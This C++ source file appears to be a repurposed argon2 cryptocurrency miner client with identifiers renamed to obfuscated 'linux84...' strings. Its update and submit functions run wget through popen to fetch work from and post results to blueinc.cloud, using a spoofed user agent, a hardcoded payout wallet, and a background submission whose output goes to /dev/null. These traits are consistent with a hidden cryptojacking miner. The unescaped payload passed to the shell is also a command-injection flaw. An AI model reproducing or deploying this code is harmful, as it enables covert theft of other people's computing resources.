//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "client.h"

#include "simplejson/json.h"

#include <string>

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

    string GetStdoutFromCommand(string cmd) {

    string data;
    FILE * stream;
    const int max_buffer = 2048;
    char buffer[max_buffer];
    cmd.append("");

    stream = popen(cmd.c_str(), "r");
    if (stream) {
    while (!feof(stream))
    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
    pclose(stream);
    }
    return data;
    }

linux888874744474_client::linux888874744474_client(arguments &args, get_status_ptr get_status) {
    __linuxweb84748874_id = args.uid();
    __linuxweb84748874_name = args.name();
    __force_argon2profile = false;
    __linux8412_report_interval = 600000;
    __timestamp = __last_linux8412_report = microseconds();
    __show_linuxweb844412441274_requests = "";
    __is_devfee_time = false;
    __get_status = get_status;
    __linux84_version = "";
}

linux888874744474_update_result linux888874744474_client::update() {
    linux888874744474_update_result result;
    result.success = false;

    uint64_t current_timestamp = microseconds();

    string response;

    //response = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/mine.php?q=info");

    string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
    
    response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
    
    json::JSON info = json::JSON::Load(response);

    result.success = (info["linux74"].ToString() == "linux88");
    
    if (result.success) {
        json::JSON data = info["linux7488"];
        result.linux841 = data["linux841"].ToString();
        result.linuxweb8888 = data["linux848"].ToString();
        result.linux8428 = (uint32_t)data["linux8428"].ToInt();
        result.linux84888874 = data["linux84888874"].ToString();
        //result.public_key = data["public_key"].ToString();
        result.linux884444884488441274444474 = (uint32_t)data["linux84747474"].ToInt();
        result.linux844 = (uint32_t)data["linux844"].ToInt();
        result.linux845 = (uint32_t)data["linux845"].ToInt();
        result.linux842 = (uint32_t)data["linux842"].ToInt();
        result.linux8412 = data["linux8412"].ToString();
    }
    
    return result;
}

linux888874744474_submit_result linux888874744474_client::submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key) {
    linux888874744474_submit_result result;
    result.success = false;
    
    string argon_data;
    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
        argon_data = linux8412.substr(29);
    else
        argon_data = linux8412.substr(30);
    
    cout << argon_data;
    
    //string payload = "argon="+ _encode(argon_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x&public_key=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";

    string payload = "argon="+ _encode(argon_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&public_key="+ _encode(public_key) +"&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&mail=linuxdistro84@gmail.com";
    
    if(__show_linuxweb844412441274_requests)
    LOG("");
    
    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/mine.php?q=submitNonce");
    
    string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux84";
    
    string response;
    
    for(int i=0;i<2;i++) { //try resubmitting if first submit fails
        //response = _http_post(url, payload, "x-www-form-urlencoded");
        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data='"+payload+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded' &> /dev/null &");
        result.linuxweb844412441274_response = response;
        if(response != "") {
            break;
        }
    }
    
    if(__show_linuxweb844412441274_requests)
    LOG("");
    
    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    return result;
}